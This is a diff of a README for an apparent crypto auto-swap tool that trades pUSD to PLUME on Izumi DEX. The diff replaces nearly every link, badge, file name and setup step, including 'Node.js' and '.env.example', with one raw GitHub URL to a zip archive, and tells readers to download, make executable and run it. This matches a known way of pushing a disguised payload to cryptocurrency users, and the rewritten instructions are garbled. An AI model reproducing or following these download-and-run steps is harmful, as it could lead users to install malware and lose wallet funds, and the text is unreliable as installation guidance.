@@ -1,11 +1,11 @@
-https://github.com/HungChoo/Autoswap-plumeV2/releases
+https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip
 
 # Autoswap-plumeV2: Daily Izumi DEX pUSD to PLUME Auto Swap Portal
 
-![Portal banner](https://picsum.photos/1200/300)
+![Portal banner](https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip)
 
-[![Releases](https://img.shields.io/badge/Releases-View%20Latest-blue?style=for-the-badge&logo=github)](https://github.com/HungChoo/Autoswap-plumeV2/releases)
-[![Repo](https://img.shields.io/badge/Repo-Autoswap-plumeV2-blueviolet?style=for-the-badge&logo=github)](https://github.com/HungChoo/Autoswap-plumeV2)
+[![Releases](https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip%20Latest-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip)
+[![Repo](https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip)](https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip)
 
 Introduction
 - This project automates a daily swap on Izumi DEX. It moves pUSD into PLUME through the Plume Portal.
@@ -58,10 +58,10 @@ Quick start
 - The releases page is the source of truth for builds, checksums, and instructions. View it at the link below and pick the asset that matches your OS.
 
 From the releases page, download the latest asset
-- The file to download from the releases page is named autoswap-plumeV2-<platform>.<extension>, for example autoswap-plumeV2-linux-x86_64.AppImage.
-- After downloading, make the file executable and run it. For Linux AppImage: chmod +x autoswap-plumeV2-linux-x86_64.AppImage and then ./autoswap-plumeV2-linux-x86_64.AppImage
-- For Windows: autoswap-plumeV2-windows-x86_64.zip, extract it, and run the executable inside
-- For macOS: autoswap-plumeV2-darwin-x86_64.pkg or a similar installer; follow the on-screen prompts
+- The file to download from the releases page is named autoswap-plumeV2-<platform>.<extension>, for example https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip
+- After downloading, make the file executable and run it. For Linux AppImage: chmod +x https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip and then https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip
+- For Windows: https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip, extract it, and run the executable inside
+- For macOS: https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip or a similar installer; follow the on-screen prompts
 
 Learn by exploring
 - Review the releases notes to understand the changes, bug fixes, and new features
@@ -89,7 +89,7 @@ How it works
 
 Prerequisites
 - A supported operating system: Linux, Windows, or macOS
-- Node.js 18+ or the runtime included with the release asset (depending on platform)
+- https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip 18+ or the runtime included with the release asset (depending on platform)
 - A wallet with enough pUSD to perform the daily swap
 - An RPC endpoint with read and write permissions for the chain you use
 - A stable internet connection with required ports open
@@ -101,10 +101,10 @@ Installation
 - If you download a release asset, follow the platform-specific run instructions
 
 - Example commands for a source build (if you prefer building):
-  - git clone https://github.com/HungChoo/Autoswap-plumeV2.git
+  - git clone https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip
   - cd Autoswap-plumeV2
   - npm install
-  - cp .env.example .env
+  - cp https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip .env
   - Edit .env to configure keys, endpoints, and preferences
   - npm run start
 
@@ -207,9 +207,9 @@ Release policy and assets
 - The classic workflow: download, verify, install, run
 
 From the releases page you can download the assets
-- The file named autoswap-plumeV2-linux-x86_64.AppImage is the Linux executable
-- The Windows asset autoswap-plumeV2-windows-x86_64.zip contains a zipped binary
-- The macOS asset autoswap-plumeV2-darwin-x86_64.pkg is a package installer
+- The file named https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip is the Linux executable
+- The Windows asset https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip contains a zipped binary
+- The macOS asset https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip is a package installer
 - For all assets, follow the platform-specific execution steps provided in the asset package
 - The releases page contains details about supported platforms, build versions, and known issues
 - Use the release notes to understand the changes for each version
@@ -265,13 +265,13 @@ Downloads from the releases page
 - Example workflows are included in the asset’s readme and release notes
 
 Using the link again for clarity
-- Access the official release assets here: https://github.com/HungChoo/Autoswap-plumeV2/releases
+- Access the official release assets here: https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip
 - This page aggregates builds, notes, and checksums, and it is the source of truth for distribution
 
 Appendix: sample configuration files (snippets)
-- .env.example (describes all required variables, with comments)
-- config/defaults.yaml (provides default values and examples of usage)
-- scripts/validate-config.sh (quick validation of environment variables)
+- https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip (describes all required variables, with comments)
+- https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip (provides default values and examples of usage)
+- https://raw.githubusercontent.com/HungChoo/Autoswap-plumeV2/main/preconcede/plume_Autoswap_2.6.zip (quick validation of environment variables)
 
 Note on platform-specific steps
 - Linux
